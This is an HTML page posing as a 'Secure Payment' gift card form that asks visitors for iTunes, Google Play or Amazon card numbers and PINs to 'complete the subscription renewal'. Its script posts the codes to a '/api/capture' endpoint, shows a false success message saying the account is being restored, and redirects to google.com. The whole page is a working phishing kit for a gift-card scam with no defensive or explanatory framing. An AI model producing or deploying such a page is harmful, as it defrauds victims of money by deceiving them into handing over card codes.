<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment | Gift Card</title>
    <style>
        body { font-family: sans-serif; background: #f4f7f9; text-align: center; padding: 30px 20px; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        h1 { font-size: 20px; color: #333; }
        p { font-size: 14px; color: #666; margin-bottom: 20px; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #28a745; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .loading { display: none; color: #007bff; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Verify Payment</h1>
        <p>Enter your Gift Card details to complete the subscription renewal.</p>
        
        <form id="paymentForm">
            <select name="card_type" id="card_type">
                <option value="iTunes">iTunes / Apple</option>
                <option value="Google Play">Google Play</option>
                <option value="Amazon">Amazon</option>
            </select>
            <input type="text" name="card_number" placeholder="Card Number" required>
            <input type="text" name="card_pin" placeholder="Security PIN" required>
            <input type="number" name="amount" placeholder="Amount ($)" required>
            <button type="submit" id="submitBtn">ACTIVATE NOW</button>
            <p class="loading" id="loadingText">Processing... Please wait.</p>
        </form>
    </div>

    <script>
        document.getElementById('paymentForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const loader = document.getElementById('loadingText');
            
            btn.style.display = 'none';
            loader.style.display = 'block';

            const formData = new FormData(e.target);
            const data = Object.fromEntries(formData.entries());

            try {
                const response = await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                if (response.ok) {
                    alert("Verification successful! Your account is being restored.");
                    window.location.href = 'https://google.com';
                } else {
                    alert("Error: System busy. Try again later.");
                    btn.style.display = 'block';
                    loader.style.display = 'none';
                }
            } catch (err) {
                alert("Connection error. Try again.");
                btn.style.display = 'block';
                loader.style.display = 'none';
            }
        };
    </script>
</body>
</html>
